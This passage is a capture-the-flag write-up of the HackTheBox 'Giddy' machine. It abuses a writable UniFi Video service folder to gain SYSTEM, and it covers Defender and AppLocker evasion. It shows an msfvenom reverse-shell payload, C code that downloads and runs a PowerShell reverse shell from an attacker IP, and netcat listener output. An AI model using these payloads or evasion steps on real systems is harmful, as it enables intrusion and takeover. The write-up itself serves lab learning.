+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w"> </span><span class="nx">HKLM:\system\currentcontrolset\services</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">where-object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">name</span><span class="w"> </span><span class="o">-Like</span><span class="w"> </span><span class="s2">"*unifivideo*"</span><span class="p">}</span><span class="w">
+
+  </span><span class="n">Hive:</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\system\currentcontrolset\services</span><span class="w">
+</span><span class="n">Name</span><span class="w">                           </span><span class="nx">Property</span><span class="w">
+</span><span class="o">----</span><span class="w">                           </span><span class="o">--------</span><span class="w">
+</span><span class="n">UniFiVideoService</span><span class="w">              </span><span class="nx">Type</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">16</span><span class="w">
+                             </span><span class="n">Start</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">
+                             </span><span class="n">ErrorControl</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
+                             </span><span class="n">ImagePath</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\ProgramData\unifi-video\avService.exe</span><span class="w"> </span><span class="nx">//RS//UniFiVideoService</span><span class="w">
+                             </span><span class="n">DisplayName</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Ubiquiti</span><span class="w"> </span><span class="nx">UniFi</span><span class="w"> </span><span class="nx">Video</span><span class="w">
+                             </span><span class="n">DependOnService</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">Tcpip</span><span class="p">,</span><span class="w"> </span><span class="nx">Afd</span><span class="p">}</span><span class="w">
+                             </span><span class="n">ObjectName</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
+                             </span><span class="n">Description</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">Ubiquiti</span><span class="w"> </span><span class="nx">UniFi</span><span class="w"> </span><span class="nx">Video</span><span class="w"> </span><span class="nx">Service</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>Querying config for the service:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="nx">/c</span><span class="w"> </span><span class="s1">'sc qc UniFiVideoService'</span><span class="w">
+</span><span class="p">[</span><span class="n">SC</span><span class="p">]</span><span class="w"> </span><span class="n">QueryServiceConfig</span><span class="w"> </span><span class="nx">SUCCESS</span><span class="w">
+
+</span><span class="n">SERVICE_NAME:</span><span class="w"> </span><span class="nx">UniFiVideoService</span><span class="w">
+        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="w">  </span><span class="n">WIN32_OWN_PROCESS</span><span class="w">
+        </span><span class="nx">START_TYPE</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">   </span><span class="nx">AUTO_START</span><span class="w">
+        </span><span class="n">ERROR_CONTROL</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">   </span><span class="nx">NORMAL</span><span class="w">
+        </span><span class="n">BINARY_PATH_NAME</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\ProgramData\unifi-video\avService.exe</span><span class="w"> </span><span class="nx">//RS//UniFiVideoService</span><span class="w">
+        </span><span class="n">LOAD_ORDER_GROUP</span><span class="w">   </span><span class="p">:</span><span class="w">
+        </span><span class="n">TAG</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+        </span><span class="n">DISPLAY_NAME</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Ubiquiti</span><span class="w"> </span><span class="nx">UniFi</span><span class="w"> </span><span class="nx">Video</span><span class="w">
+        </span><span class="n">DEPENDENCIES</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Tcpip</span><span class="w">
+                           </span><span class="p">:</span><span class="w"> </span><span class="n">Afd</span><span class="w">
+        </span><span class="nx">SERVICE_START_NAME</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Says, stoppable. and states the Binary path at <code class="language-plaintext highlighter-rouge">C:\ProgramData\unifi-video\avService.exe</code></p>
+
+<p>Let’s search for exploits on <code class="language-plaintext highlighter-rouge">Ubiquiti</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit ubiquiti unifi video privilege escalation
+<span class="nt">-------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                               |  Path
+<span class="nt">-------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation      | windows/local/43390.txt
+<span class="nt">-------------------------------------------------------------</span> <span class="nt">--------------------------------</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Upon start and stop of the service, it tries to load and execute the file at
+<code class="language-plaintext highlighter-rouge">C:\ProgramData\unifi-video\taskkill.exe</code>. 
+By copying an arbitrary <code class="language-plaintext highlighter-rouge">taskkill.exe</code> to <code class="language-plaintext highlighter-rouge">C:\ProgramData\unifi-video\</code> as an
+unprivileged user, it is therefore possible to escalate privileges and execute
+arbitrary code as <code class="language-plaintext highlighter-rouge">NT AUTHORITY/SYSTEM</code>.</p>
+
+<p>Checking permissions for <code class="language-plaintext highlighter-rouge">c:\ProgramData\unifi-video</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\programdata</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">unifi-video</span><span class="w">
+</span><span class="n">unifi-video</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+            </span><span class="n">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+            </span><span class="n">CREATOR</span><span class="w"> </span><span class="nx">OWNER:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
+            </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">
+            </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">WD</span><span class="p">,</span><span class="nx">AD</span><span class="p">,</span><span class="nx">WEA</span><span class="p">,</span><span class="nx">WA</span><span class="p">)</span><span class="w">
+
+</span><span class="n">Successfully</span><span class="w"> </span><span class="nx">processed</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">files</span><span class="p">;</span><span class="w"> </span><span class="n">Failed</span><span class="w"> </span><span class="nx">processing</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">files</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>WD (write data/add file) permissions for Users.</p>
+
+<p>Uploading a reverse-shell exe file with msfvenom as <code class="language-plaintext highlighter-rouge">taskkill.exe</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.18 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="nt">-o</span> taskkill.exe
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: taskkill.exe
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>But the file doesn’t run because it’s blocked by Defender.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\programdata\unifi-video</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\taskkill.exe</span><span class="w">
+</span><span class="n">Program</span><span class="w"> </span><span class="s1">'taskkill.exe'</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">Operation</span><span class="w"> </span><span class="nx">did</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">complete</span><span class="w"> </span><span class="nx">successfully</span><span class="w"> </span><span class="nx">because</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">contains</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">virus</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">potentially</span><span class="w"> </span><span class="nx">unwanted</span><span class="w"> </span><span class="nx">softwareAt</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:1</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="o">.</span><span class="n">\taskkill.exe</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nx">~~~~~~~~~~~~~~.</span><span class="w">
+</span><span class="n">At</span><span class="w"> </span><span class="nx">line:1</span><span class="w"> </span><span class="nx">char:1</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="o">.</span><span class="n">\taskkill.exe</span><span class="w">
+</span><span class="o">+</span><span class="w"> </span><span class="nx">~~~~~~~~~~~~~~</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="n">CategoryInfo</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">ResourceUnavailable:</span><span class="w"> </span><span class="p">(:)</span><span class="w"> </span><span class="p">[],</span><span class="w"> </span><span class="n">ApplicationFailedException</span><span class="w">
+    </span><span class="o">+</span><span class="w"> </span><span class="nx">FullyQualifiedErrorId</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">NativeCommandFailed</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="bypass-av-win-defender">Bypass-AV (Win-Defender)</h1>
+<ul>
+  <li>Encoding payload with some iterations of shikata-ga-nai encoding with msfvenom didn’t work.</li>
+  <li>Using a framework like veil-evasion didn’t work for me.</li>
+</ul>
+
+<p>Let’s make binaries manually:</p>
+
+<p>A payload like this works:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="cp">#include "stdlib.h"
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"whoami"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Compile this using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>i686-w64-mingw32-gcc exploit.c <span class="nt">-o</span> exploit.exe
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>But this one doesn’t work and gives an error <code class="language-plaintext highlighter-rouge">exploit.exe : New-Object : Cannot create type. Only core types are supported in this language mode.</code> Because Constratined-Language mode is enabled. Bypassing CLM is discussed <a href="https://0xcaretaker.github.io/posts/Giddy/#PSBypassCLM">below</a>. I’ll use another workaround.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="cp">#include "stdlib.h"
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.18/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.18 -Port 4444"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Since, I can execute basic commands. I can just make another user and make it administrator, but that wasn’t working for some reason. Still I can read root.txt:
+(Note: I can still take a shell with nc.exe)</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre><span class="cp">#include "stdlib.h"
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"copy C:</span><span class="se">\\</span><span class="s">users</span><span class="se">\\</span><span class="s">administrator</span><span class="se">\\</span><span class="s">desktop</span><span class="se">\\</span><span class="s">root.txt C:</span><span class="se">\\</span><span class="s">users</span><span class="se">\\</span><span class="s">stacy</span><span class="se">\\</span><span class="s">desktop</span><span class="se">\\</span><span class="s">root.txt"</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Putting the file at the desired location, restarting the service:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">\\10.10.14.5\share\exploit.exe</span><span class="w"> </span><span class="nx">C:\programdata\unifi-video\taskkill.exe</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">stop-service</span><span class="w"> </span><span class="nx">UniFiVideoService</span><span class="w">
+</span><span class="n">Warning:</span><span class="w"> </span><span class="nx">Waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">stop...</span><span class="w">
+</span><span class="n">Warning:</span><span class="w"> </span><span class="nx">Waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">stop...</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">start-service</span><span class="w"> </span><span class="nx">UniFiVideoService</span><span class="w">
+</span><span class="n">Warning:</span><span class="w"> </span><span class="nx">Waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="s1">'Ubiquiti UniFi Video (UniFiVideoService)'</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">start...</span><span class="w">
+</span><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="n">CF559C6C121F683BF3E56891E80641B1</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>To get a reverse shell you can use this <a href="https://github.com/dev-frog/C-Reverse-Shell">C-Reverse-Shell code</a>.</p>
+<blockquote>
+  <p>Google <em>“reverse shell in c windows”</em> to get this link.</p>
+</blockquote>
+
+<p>I changed the IP and port no. specified in <code class="language-plaintext highlighter-rouge">re.cpp</code> then compile it using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>i686-w64-mingw32-g++ re.cpp <span class="nt">-o</span> taskkill.exe <span class="nt">-lws2_32</span> <span class="nt">-lwininet</span> <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Then:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">copy</span><span class="w"> </span><span class="nx">\\10.10.14.5\share\taskkill.exe</span><span class="w"> </span><span class="nx">C:\programdata\unifi-video\taskkill.exe</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">stop-service</span><span class="w"> </span><span class="nx">UnifiVideoService</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">start-service</span><span class="w"> </span><span class="nx">UnifiVideoService</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And I get a shell on listener as <code class="language-plaintext highlighter-rouge">nt authority\system</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>root@TheCaretaker:~/HTB/Giddy<span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 4444
+listening on <span class="o">[</span>any] 4444 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.104] 49751
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="group-policy-bypass--applock-bypass">Group Policy bypass / Applock Bypass</h1>
+<p>If I pull <code class="language-plaintext highlighter-rouge">winpeas</code> binary and want to automate the enumeration on <code class="language-plaintext highlighter-rouge">Possible DLL Hijacking on UnifiVideoService</code>. Giddy doesn’t let me execute the binary. 
+That’s because there’s a Group Policy blocking execution.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\winpeas.exe</span><span class="w">
+</span><span class="n">Program</span><span class="w"> </span><span class="s1">'winpeas.exe'</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">This</span><span class="w"> </span><span class="nx">program</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">blocked</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">policy.</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Usually Applocker whitelists everything under <code class="language-plaintext highlighter-rouge">windows</code> directory. But <a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">here’s</a> a list of writable directories where applocker won’t block executing binaries.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\windows\system32\spool\drivers\color\winpeas.exe</span><span class="w">
+             </span><span class="o">*</span><span class="p">((,</span><span class="o">.</span><span class="p">,</span><span class="n">/</span><span class="p">((((((((((((((((((((</span><span class="n">/</span><span class="p">,</span><span class="w">  </span><span class="o">*</span><span class="nx">/</span><span class="w">
+      </span><span class="p">,</span><span class="n">/</span><span class="o">*</span><span class="p">,</span><span class="o">..*</span><span class="p">((((((((((((((((((((((((((((((((((,</span><span class="w">
+    </span><span class="p">,</span><span class="o">*</span><span class="n">/</span><span class="p">((((((((((((((((((</span><span class="n">/</span><span class="p">,</span><span class="w">  </span><span class="o">.*</span><span class="nx">//</span><span class="p">((</span><span class="n">//</span><span class="o">**</span><span class="p">,</span><span class="w"> </span><span class="o">.*</span><span class="p">(((((((</span><span class="o">*</span><span class="w">
+    </span><span class="p">((((((((((((((((</span><span class="o">**********</span><span class="n">/</span><span class="c">########## .(* ,(((((((</span><span class="w">
+    </span><span class="p">(((((((((((</span><span class="n">/</span><span class="o">********************</span><span class="nx">/</span><span class="c">####### .(. (((((((</span><span class="w">
+    </span><span class="p">((((((</span><span class="o">..******************</span><span class="n">/</span><span class="err">@@@@@</span><span class="nx">/</span><span class="o">***</span><span class="nx">/</span><span class="c">###### ./(((((((</span><span class="w">
+    </span><span class="p">,,</span><span class="o">....********************</span><span class="err">@@@@@@@@@</span><span class="p">@(</span><span class="err">***</span><span class="p">,</span><span class="c">#### .//((((((</span><span class="w">
+    </span><span class="p">,</span><span class="w"> </span><span class="p">,</span><span class="err">..********************/@@@@@%@@@@/********</span><span class="c">##((/ /((((</span><span class="w">
+    </span><span class="err">..((</span><span class="c">###########*********/%@@@@@@@@@/************,,..((((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">##################(/******/@@@@@/***************.. /((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">#########################(/**********************..*((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">##############################(/*****************.,(((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">###################################(/************..(((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">#######################################(*********..(((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">#######(,.***.,(###################(..***.*******..(((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">#######*(#####((##################((######/(*****..(((</span><span class="w">
+    </span><span class="err">.(</span><span class="c">###################(/***********(##############(...(((</span><span class="w">
+    </span><span class="err">.((</span><span class="c">#####################/*******(################.((((((</span><span class="w">
+    </span><span class="err">.(((</span><span class="c">############################################(..((((</span><span class="w">
+    </span><span class="err">..(((</span><span class="c">##########################################(..(((((</span><span class="w">
+    </span><span class="err">....((</span><span class="c">########################################( .(((((</span><span class="w">
+    </span><span class="err">......((</span><span class="c">####################################( .((((((</span><span class="w">
+    </span><span class="err">(((((((((</span><span class="c">#################################(../((((((</span><span class="w">
+        </span><span class="err">(((((((((/</span><span class="c">##########################(/..((((((</span><span class="w">
+              </span><span class="err">(((((((((/</span><span class="p">,</span><span class="err">.</span><span class="w">  </span><span class="p">,</span><span class="err">*//////*</span><span class="p">,</span><span class="err">.</span><span class="w"> </span><span class="err">./(((((((((((((((.</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Winpeas shows 2 interesting things to look onto:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">DLL Hijacking</code> on Unifi-Video
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>  Ubiquiti UniFi Video<span class="o">(</span>Ubiquiti Networks, Inc. - Ubiquiti UniFi Video<span class="o">)[</span>C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video<span class="se">\a</span>vService.exe //RS//UniFiVideoService] - Autoload - No quotes and Space detected
+  Possible DLL Hijacking <span class="k">in </span>binary folder: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video <span class="o">(</span>Users <span class="o">[</span>WriteData/CreateFiles]<span class="o">)</span>
+  Ubiquiti UniFi Video Service
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>PS History file
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">PowerShell</span><span class="w"> </span><span class="nx">Settings</span><span class="w">
+  </span><span class="n">PowerShell</span><span class="w"> </span><span class="nx">v2</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> 
+  </span><span class="n">PowerShell</span><span class="w"> </span><span class="nx">v5</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> </span><span class="nx">5.1.14393.0</span><span class="w">
+  </span><span class="n">PowerShell</span><span class="w"> </span><span class="nx">Core</span><span class="w"> </span><span class="nx">Version:</span><span class="w"> 
+  </span><span class="n">Transcription</span><span class="w"> </span><span class="nx">Settings:</span><span class="w"> 
+  </span><span class="kr">Module</span><span class="w"> </span><span class="n">Logging</span><span class="w"> </span><span class="nx">Settings:</span><span class="w"> 
+  </span><span class="n">Scriptblock</span><span class="w"> </span><span class="nx">Logging</span><span class="w"> </span><span class="nx">Settings:</span><span class="w"> 
+  </span><span class="n">PS</span><span class="w"> </span><span class="nx">history</span><span class="w"> </span><span class="nx">file:</span><span class="w"> </span><span class="nx">C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span class="w">
+  </span><span class="n">PS</span><span class="w"> </span><span class="nx">history</span><span class="w"> </span><span class="nx">size:</span><span class="w"> </span><span class="nx">207B</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="pshistory">PSHistory</h2>
+<p>PowerShell History is enabled by default starting in PowerShell v5 on Windows 10.
+They are usually as <code class="language-plaintext highlighter-rouge">$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>
+You can even run <code class="language-plaintext highlighter-rouge">(Get-PSReadLineOption).HistorySavePath</code> to the path.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
